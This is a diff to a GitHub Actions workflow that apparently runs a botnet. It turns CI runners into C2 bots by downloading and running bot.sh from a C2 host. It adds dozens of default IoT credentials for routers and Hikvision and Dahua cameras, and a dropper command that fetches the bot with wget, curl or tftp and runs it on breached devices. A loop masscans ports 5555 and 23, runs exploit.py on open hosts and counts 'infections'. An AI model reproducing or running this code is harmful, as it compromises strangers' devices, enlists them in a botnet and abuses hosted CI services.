@@ -43,10 +43,10 @@ jobs:
           S="${{ matrix.slice }}"
 
           # ═══════════════════════════════════════
-          # Self-register as C2 bot
+          # Self-register as C2 bot (bot.sh daemonize)
           # ═══════════════════════════════════════
-          curl -s "http://$C2:$PPORT/bot.py" -o /tmp/bot.py 2>/dev/null
-          python3 /tmp/bot.py "$C2" "$CPORT" "enibot2024" "gh-slice-$S" &
+          curl -s "http://$C2:$PPORT/bot.sh" -o /tmp/me.sh 2>/dev/null
+          sh /tmp/me.sh "$C2" "$CPORT" "enibot2024" "gh-slice-$S" &
           echo "Bot registered → $C2:$CPORT (gh-slice-$S)"
 
           # ═══════════════════════════════════════════════
@@ -77,15 +77,27 @@ jobs:
               ("user","user"),("ubnt","ubnt"),("pi","raspberry"),
               ("default","default"),("default","password"),("default","admin"),
               ("mother","fucker"),
+              # ── 2024-2026 新增高价值 ──
+              ("root","1234"),("root","admin123"),("root","12345678"),("root","123456789"),
+              ("root","88888888"),("root","66666666"),("root","qwerty"),("root","abc123"),
+              ("root","1111111"),("root","00000000"),("root","abcd1234"),("root","Zte521"),
+              ("admin","admin888"),("admin","manager"),("admin","1111111"),
+              ("admin","12345678"),("admin","88888888"),("admin","letmein"),
+              ("guest","guest123"),("guest","admin"),("guest","password"),
+              ("ubnt","ubnt123"),("ubnt","admin"),("pi","pi"),
+              ("hikvision","hikvision"),("hikvision","123456"),("hikvision","admin"),
+              ("telecomadmin","admintelecom"),("telecomadmin","nE7jA%5m"),
+              ("admin1","admin1"),("admin1","password"),("admin1","123456"),
+              ("dahua","dahua"),("dahua","admin"),("dahua","123456"),
+              ("rdp","rdp"),("user","password"),
           ]
 
+          # bot.sh 自带守护进程, 直接后台启动即可
           DEPLOY = (
-              # nohup + disown 防止shell断开时被杀
-              f"(busybox wget -q http://{C2}:{PPORT}/bot.sh -O /tmp/sshd; busybox nohup sh /tmp/sshd {C2} {CPORT} enibot2024 &; busybox disown) || "
-              f"(busybox wget -q http://{C2}:{PPORT}/bot.py -O /tmp/sshd; python3 /tmp/sshd {C2} {CPORT} enibot2024 &) || "
-              f"(busybox wget -q http://{C2}:{PPORT}/bot.sh -O /tmp/sshd; busybox sh /tmp/sshd {C2} {CPORT} enibot2024 &) || "
-              f"(wget -q http://{C2}:{PPORT}/bot.sh -O /tmp/sshd; nohup sh /tmp/sshd {C2} {CPORT} enibot2024 &) || "
-              f"(curl -s http://{C2}:{PPORT}/bot.sh -o /tmp/sshd; nohup sh /tmp/sshd {C2} {CPORT} enibot2024 &)"
+              f"(busybox wget -q http://{C2}:{PPORT}/bot.sh -O /tmp/sshd && busybox sh /tmp/sshd {C2} {CPORT} enibot2024) || "
+              f"(wget -q http://{C2}:{PPORT}/bot.sh -O /tmp/sshd && sh /tmp/sshd {C2} {CPORT} enibot2024) || "
+              f"(curl -s http://{C2}:{PPORT}/bot.sh -o /tmp/sshd && sh /tmp/sshd {C2} {CPORT} enibot2024) || "
+              f"(busybox tftp -g -r bot.sh -l /tmp/sshd {C2} && busybox sh /tmp/sshd {C2} {CPORT} enibot2024)"
           )
 
           infected = []
@@ -236,49 +248,62 @@ jobs:
           )
 
           # ═══════════════════════════════════════
-          # Main hunt loop
+          # Main hunt loop — 连续循环扫描
           # ═══════════════════════════════════════
           TOTAL=0
+          PASS=0
           START=$SECONDS
-          MAX_RUNTIME=$((5 * 3600))
+          MAX_RUNTIME=$((5 * 3600))  # 5小时扫描, 留1小时给bot
 
           echo "╔══════════════════════════════════════╗"
-          echo "║  HUNTER $S LAUNCH                    ║"
+          echo "║  HUNTER $S — CONTINUOUS MODE         ║"
           echo "║  Targets: ${RANGES[$S]}"
           echo "╚══════════════════════════════════════╝"
 
-          for RANGE in ${RANGES[$S]}; do
+          while true; do
             [ $((SECONDS - START)) -ge $MAX_RUNTIME ] && break
+            PASS=$((PASS + 1))
+            echo ""
+            echo "══════════ PASS $PASS ══════════"
+
+            for RANGE in ${RANGES[$S]}; do
+              [ $((SECONDS - START)) -ge $MAX_RUNTIME ] && break
+
+              echo "━━━ [S$S-P$PASS] $RANGE ━━━"
+              sudo masscan "$RANGE" -p5555,23 --rate=50000 --open-only --wait=0 \
+                -oG "/tmp/scan_${S}.txt" 2>/dev/null
+
+              COUNT=$(grep -c "Host:" "/tmp/scan_${S}.txt" 2>/dev/null || echo 0)
+              echo "  Open hosts: $COUNT"
+
+              if [ "$COUNT" -gt 0 ]; then
+                python3 /tmp/exploit.py "$C2" "$CPORT" "$PPORT" \
+                  "/tmp/scan_${S}.txt" "/tmp/results_${S}.txt"
+
+                NEW=$(wc -l < "/tmp/results_${S}.txt" 2>/dev/null || echo 0)
+                if [ "$NEW" -gt 0 ]; then
+                  TOTAL=$((TOTAL + NEW))
+                  echo "  🧬 +$NEW | 总计: $TOTAL"
+                  while read -r LINE; do
+                    echo "    ✅ $LINE"
+                  done < "/tmp/results_${S}.txt"
+                  cat "/tmp/results_${S}.txt" >> /tmp/all_infections.txt
+                fi
+              fi
+            done
 
             echo ""
-            echo "━━━ [Runner $S] Scanning $RANGE ━━━"
+            echo "═══ PASS $PASS DONE — $TOTAL total | $(date -u +%H:%M:%S) ═══"
 
-            sudo masscan "$RANGE" -p5555,23 --rate=50000 --open-only --wait=0 \
-              -oG "/tmp/scan_${S}.txt" 2>/dev/null
-
-            COUNT=$(grep -c "Host:" "/tmp/scan_${S}.txt" 2>/dev/null || echo 0)
-            echo "  Open hosts: $COUNT"
-
-            if [ "$COUNT" -gt 0 ]; then
-              python3 /tmp/exploit.py "$C2" "$CPORT" "$PPORT" \
-                "/tmp/scan_${S}.txt" "/tmp/results_${S}.txt"
-
-              NEW=$(wc -l < "/tmp/results_${S}.txt" 2>/dev/null || echo 0)
-              if [ "$NEW" -gt 0 ]; then
-                TOTAL=$((TOTAL + NEW))
-                echo "  🧬 New infections this range: $NEW | Total: $TOTAL"
-                while read -r LINE; do
-                  echo "    ✅ $LINE"
-                done < "/tmp/results_${S}.txt"
-                cat "/tmp/results_${S}.txt" >> /tmp/all_infections.txt
-              fi
-            fi
+            # 30秒休息避免触发速率限制
+            [ $((SECONDS - START)) -lt $MAX_RUNTIME ] && sleep 30
           done
 
           echo ""
           echo "╔══════════════════════════════════════╗"
           echo "║  HUNTER $S COMPLETE                  ║"
-          echo "║  Total infected: $TOTAL              ║"
+          echo "║  Passes: $PASS | Infected: $TOTAL    ║"
           echo "╚══════════════════════════════════════╝"
 
-          sleep 86400 & wait
+          # Keep bot alive until workflow timeout
+          sleep 3600
